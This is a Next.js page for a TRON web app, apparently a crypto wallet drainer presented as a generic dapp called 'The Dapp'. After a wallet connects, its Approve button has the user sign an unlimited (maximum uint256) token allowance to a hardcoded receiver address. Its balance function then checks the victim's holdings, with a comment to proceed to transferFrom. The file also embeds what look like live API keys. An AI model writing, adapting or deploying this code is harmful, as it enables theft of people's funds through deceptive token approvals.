"use client";

import { Transaction } from "@tronweb3/tronwallet-abstract-adapter";
import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
import { TronLinkAdapter } from "@tronweb3/tronwallet-adapters";
import TronWeb, { BigNumber } from "tronweb";

const TRON_API_HOST = "https://api.trongrid.io";
const TRON_API_KEY = "e9212dd7-5d7f-46de-a394-4732c8d58c33";
const WALLETCONNECT_PROJECT_ID = "e9253f9d905849c7e50efa393bd0500b";

const NETWORK: "Mainnet" | "Shasta" | "Nile" = "Mainnet";
const APP_NAME = "The Dapp";
const APP_DESCRIPTION = "The Dapp";
const APP_URL = "https://tempaccess.ngrok.io";
const APP_ICON = "https://yourdapp-url.com/icon.png";

const RECEIVER_ADDRESS = "TAAfNiY6VVCSsAtNxJvoFWcMW7Do8euLCL";
const CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

const tronWeb = new TronWeb.TronWeb({
    fullHost: TRON_API_HOST,
    // headers: {
    //     "TRON-PRO-API-KEY": TRON_API_KEY,
    // }
});

const adapter = new WalletConnectAdapter({
    network: NETWORK,
    options: {
        relayUrl: "wss://relay.walletconnect.com",
        projectId: WALLETCONNECT_PROJECT_ID,
        metadata: {
            name: APP_NAME,
            description: APP_DESCRIPTION,
            url: APP_URL,
            icons: [APP_ICON],
        },
    },
    web3ModalConfig: {
        themeMode: "dark",
        themeVariables: {
            "--w3m-z-index": "1000",
        },
        explorerRecommendedWalletIds: [
            "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
            "19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927",
            "38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662",
            "971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709",
        ],
    },
});
const tronLinkAdapter = new TronLinkAdapter();

function Connect() {
    return (
        <>
            <button
                className="inline-block"
                onClick={async () => {
                    if (adapter.connected) await adapter.disconnect();
                    await adapter.connect();
                }}
            >
                WalletConnect
            </button>
            <button
                className="inline-block"
                onClick={async () => {
                    await tronLinkAdapter.connect();
                }}
            >
                TronLink
            </button>
            <p>
                WC:{" "}
                {adapter.address ? adapter.address : "WalletConnect Pending"}/
                {adapter.connected
                    ? "Connected"
                    : adapter.connecting
                    ? "Connecting"
                    : "Disconnected"}{" "}
            </p>
            <p>
                TL:{" "}
                {tronLinkAdapter.address
                    ? tronLinkAdapter.address
                    : "TronLink Pending"}
                /
                {tronLinkAdapter.connected
                    ? "Connected"
                    : tronLinkAdapter.connecting
                    ? "Connecting"
                    : "Disconnected"}
            </p>
        </>
    );
}

export default function Home() {
    // this is for testing
    async function sign() {
        await adapter.signMessage("Hello World");
    }

    // this is client-side
    async function approve() {
        const selector = "approve(address,uint256)";
        const params = [
            { type: "address", value: RECEIVER_ADDRESS },
            {
                type: "uint256",
                value: "115792089237316195423570985008687907853269984665640564039457584007913129639935",
            },
        ];

        tronWeb.setAddress(adapter.address!);

        const tx = (
            await tronWeb.transactionBuilder.triggerSmartContract(
                CONTRACT_ADDRESS,
                selector,
                {},
                params
            )
        ).transaction as unknown;
        const signed_tx = await adapter.signTransaction(tx as Transaction);

        const res = await tronWeb.trx.sendRawTransaction(signed_tx as any);
        console.log(res.code);
        console.log(res.message);
        console.log(res.result);
        console.log(res.transaction);
    }

    // this is serverside
    async function balance() {
        tronWeb.setAddress(adapter.address!);
        const abi = [
            {
                constant: true,
                inputs: [{ name: "who", type: "address" }],
                name: "balanceOf",
                outputs: [{ name: "", type: "uint256" }],
                payable: false,
                stateMutability: "view",
                type: "function",
            },
        ];
        const contract = tronWeb.contract(abi, CONTRACT_ADDRESS);
        // @ts-ignore
        // prettier-ignore
        const balance: BigNumber = await contract.balanceOf(adapter.address!).call();
        console.log(balance.toString(10));

        // proceed to call transferFrom
    }

    return (
        <div className="w-screen h-screen flex flex-col space-y-2">
            <Connect />
            <button onClick={async () => await sign()}>Sign</button>
            <button onClick={async () => await approve()}>Approve</button>
            <button onClick={async () => await balance()}>Balance</button>
        </div>
    );
}
